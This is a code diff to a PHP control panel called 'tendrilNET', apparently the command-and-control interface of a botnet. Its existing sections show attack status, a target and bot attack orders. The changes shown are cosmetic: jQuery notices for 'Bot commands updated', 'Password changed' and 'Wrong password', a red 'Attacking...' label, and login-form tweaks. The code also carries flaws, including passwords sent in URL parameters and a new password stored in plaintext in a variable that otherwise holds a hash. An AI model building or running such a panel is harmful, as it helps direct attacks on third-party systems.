@@ -112,11 +112,13 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	}
 
 	// save new password
+	$pwMessage = 0;
 	if($_GET['np'] != "") {
 		$writePw = fopen($passFile, "w");
 		fwrite($writePw, hash("sha512", $_GET['np'])."\n");
 		fclose($writePw);
 		$curPw = $_GET['np'];
+		$pwMessage = 1;
 	}
 
 	// display panel
@@ -133,12 +135,27 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "$( \"#tabs\" ).tabs();";
 	print "$( \"#accordion\" ).accordion();";
 	print "$( \"#attackorder\" ).selectmenu();";
+	print "function runEffect() {";
+        print "options = { percent: 100 };";
+        print "$( \"#effect\" ).show( \"slide\", options, 500, callback );";
+        print "};";
+        print "function callback() {";
+        print "setTimeout(function() {";
+        print "$( \"#effect:visible\" ).removeAttr( \"style\" ).fadeOut();";
+        print "}, 2000 );";
+        print "};";
+        print "$( \"#effect\" ).toggle(function() {";
+        print "runEffect();";
+        print "});";
+        print "$( \"#effect\" ).hide();";
 	print "});";
 	print "</script>";
 	print "<style>";
 	print "select {";
 	print "width: 150px;";
+	print "font-size: 14px;";
 	print "}";
+        print "#effect { font-family: Arial, sans-serif; font-size: 14px; width: 95%; padding: 0.4em; text-align: center; background: #00B3FF; border: 0px; color: #ffffff;}";
 	print "</style>";
 	print "</head>";
 	print "<body id=\"bodyLogin\">";
@@ -152,6 +169,23 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "</ul>";
 
 	print "<div id=\"tabs-1\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
+
+ 	if ($_GET['order'] != "" && $_GET['target'] != "") {
+                print "<div align=\"center\">";
+                print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
+                print "Bot commands updated.";
+                print "</div>";
+                print "</div>";
+        }
+	if ($_GET['np'] != "") {
+                print "<div align=\"center\">";
+                print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
+                print "Password changed.";
+                print "</div>";
+                print "</div>";
+        }
+
+
 	print "<div id=\"accordion\">";
 	print "<h3>Attack Status</h3>";
 	print "<div>";
@@ -162,7 +196,7 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 		print "Not attacking.";
 	}
 	if ($order == "yes") {
-		print "Attacking...";
+		print "<div style=\"color: red;\">Attacking...</div>";
 	}
 	print "</td></tr>";
 	print "<tr id=\"trAlt\"><td>Target:</td>";
@@ -225,7 +259,33 @@ else {
 	print "<html>";
 	print "<head>";
 	print "<title>tendrilNET Login Panel</title>";
-	print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
+
+	print "<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css\">";
+        print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
+        print "<script src=\"//code.jquery.com/jquery-1.10.2.js\"></script>";
+        print "<script src=\"//code.jquery.com/ui/1.11.3/jquery-ui.js\"></script>";
+        print "<link rel=\"stylesheet\" href=\"/resources/demos/style.css\">";
+	print "<style>";
+	print "#effect { font-family: Arial, sans-serif; font-size: 14px; width: 95%; padding: 0.4em; text-align: center; background: #aa0000; opacity: 0.75; border: 0px; color: #ffffff;}";
+	print "</style>";
+        print "<script>";
+        print "$(function() {";
+	print "function runEffect() {";
+	print "options = { percent: 100 };";
+	print "$( \"#effect\" ).show( \"shake\", options, 500, callback );";
+	print "};";
+	print "function callback() {";
+	print "setTimeout(function() {";
+	print "$( \"#effect:visible\" ).removeAttr( \"style\" ).fadeOut();";
+	print "}, 2000 );";
+	print "};";
+	print "$( \"#effect\" ).toggle(function() {";
+	print "runEffect();";
+	print "});";
+	print "$( \"#effect\" ).hide();";
+	print "});";
+        print "</script>";
+
 	print "</head>";
 	print "<body id=\"bodyLogin\">";
 
@@ -235,11 +295,21 @@ else {
 	print "<div id=\"loginForm\">";
 	print "<form method=\"get\">";
 	print "<table border=\"0\" align=\"center\">";
-	print "<tr><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"Password\"></td>";
+	print "<tr><td>";
+	print "<input id=\"input\" type=\"password\" name=\"p\" placeholder=\"Password\"></td>";
 	print "<td><input id=\"loginButton\" type=\"submit\" value=\"Login\"></td></tr>";
-	print "</table>";
 	print "</form>";
 	print "</div>";
+	print "</table>";
+
+	print "</td></tr><tr><td>";
+	if ($curPw != hash("sha512", $_GET['p']) && $_GET['p'] != "") {
+		print "<div align=\"center\">";
+		print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
+		print "Wrong password!";
+		print "</div>";
+		print "</div>";
+	}
 	print "</td></tr></table>";
 
 	print "</body>";
